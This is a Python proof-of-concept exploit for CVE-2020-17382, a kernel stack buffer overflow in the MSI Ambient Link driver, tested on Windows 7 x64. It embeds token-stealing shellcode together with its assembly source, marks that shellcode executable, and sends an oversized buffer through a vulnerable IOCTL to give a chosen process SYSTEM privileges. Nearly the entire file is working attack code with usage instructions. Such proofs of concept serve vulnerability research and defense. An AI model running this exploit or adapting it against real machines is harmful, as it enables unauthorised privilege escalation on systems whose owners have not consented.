#!/usr/bin/python
# MSI Ambient Link Driver - Kernel Stack-based Buffer Overflow
# Reference: https://www.coresecurity.com/core-labs/advisories/msi-ambient-link-multiple-vulnerabilities
# CVE-2020-17382 
# Matteo Malvica - 28/09/2020
# www.matteomalvica.com
# Tested on Win7 x64 SP1

from ctypes import *
import time, struct, sys, thread, os

kernel32 = windll.kernel32
Psapi    = windll.Psapi
    
if __name__ == '__main__':

    if len(sys.argv) < 2:
        print("\n(!) ERROR:\t - missing argument -\n"+"-"*10)
        print("(*) USAGE:\t 'python %s <TARGET PID>" % sys.argv[0])
        print("(*) EXAMPLE:\t 'python %s 1984'\n"% sys.argv[0])
        sys.exit()
    else:
        target_pid = int(sys.argv[1])

    print("(*) MSI Ambient Link Stack-based Buffer Overflow")
    GENERIC_READ  = (1 << 30)
    GENERIC_WRITE = (1 << 31)
    FILE_SHARE_READ = 1 
    FILE_SHARE_WRITE = 2
    OPEN_EXISTING = 3
    FILE_ATTRIBUTE_NORMAL = 0x80
    IOCTL_VULN    = 0x80102040 # triggers BoF

    # DosDevices\MSIO64 Device\MsIo
    DEVICE_NAME   = "\\\\.\\MsIo".encode()
    dwReturn      = c_ulong()
    out_size      = 0x48
    evil_output   = ""
    #driver_name   = 'MSIO64.sys'

    target_pid = struct.pack("<H",int(target_pid))

    # token stealing shellcode
    shellcode = bytearray(
    "\x65\x48\x8B\x14\x25\x88\x01\x00"
    "\x00\x4C\x8B\x42\x70\x4D\x8B\x88"
    "\x88\x01\x00\x00\x49\x8B\x09\x48"
    "\x8B\x51\xF8\x48\x83\xFA\x04\x74"
    "\x05\x48\x8B\x09\xEB\xF1\x48\x8B"
    "\x81\x80\x00\x00\x00\x24\xF0\x48"
    "\x8B\x51\xF8\x48\x81\xFA"+ target_pid+
    "\x00\x00\x74\x05\x48\x8B\x09\xEB"
    "\xEE\x48\x89\x81\x80\x00\x00\x00"
    "\x90\x90\xEB\xFE")

    '''
    [BITS 64]

    ; Windows 7 x64 token stealing shellcode
    ; based on http://mcdermottcybersecurity.com/articles/x64-kernel-privilege-escalation

    start:
        mov rdx, [gs:188h]   ;KTHREAD pointer
        mov r8, [rdx+70h]    ;EPROCESS pointer
        mov r9, [r8+188h]    ;ActiveProcessLinks list head
        mov rcx, [r9]        ;follow link to first process in list
    find_system:
        mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
        cmp rdx, 4           ;UniqueProcessId == 4? 
        jz found_system      ;YES - move on
        mov rcx, [rcx]       ;NO - load next entry in list
        jmp find_system      ;loop
    found_system:
        mov rax, [rcx+80h]   ;offset to token
        and al, 0f0h         ;clear low 4 bits of _EX_FAST_REF structure
    find_cmd:
        mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
        cmp rdx, 0d54h       ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
        jz found_cmd         ;YES - move on
        mov rcx, [rcx]       ;NO - next entry in list
        jmp find_cmd         ;loop
    found_cmd:
        mov [rcx+80h], rax   ;copy SYSTEM token over top of this process's token
    return:
        nop                  ; will be manually patched to 0xEBFE (jmp short 0)
    '''

    print("[*] Allocating shellcode character array...")
    usermode_addr = (c_char * len(shellcode)).from_buffer(shellcode)
    ptr = addressof(usermode_addr)

    print("[*] Marking shellcode RWX...")
    
    result = kernel32.VirtualProtect(
        usermode_addr,
        c_int(len(shellcode)),
        c_int(0x40),
        byref(c_ulong())
    )

    if result != 0:
        print("[*] Successfully marked shellcode RWX.")
    else:
        print("[!] Failed to mark shellcode RWX.")
        sys.exit(1)


    payload = struct.pack("<Q",ptr)
    print("[*] Shellcode pointer is at: %s." % hex(ptr))
    buf = "A" * 0x48 + payload
    buf_length = len(buf)


    driver_handle = kernel32.CreateFileA(DEVICE_NAME,    
        0xC0000000, 
        0, 
        None, 
        0x3, 
        0, 
        None)

    if driver_handle != -1:
        # We store values to overcome input checks
        print("(+) We got handle! Sending vulnerable IOCTL...")
        dev_ioctl = kernel32.DeviceIoControl(
        driver_handle,
        IOCTL_VULN,
        buf,
        buf_length,
        None,
        0,
        byref(c_ulong()),
        None
    )
    else:
        print("(!) Couldn't get a driver handle!")


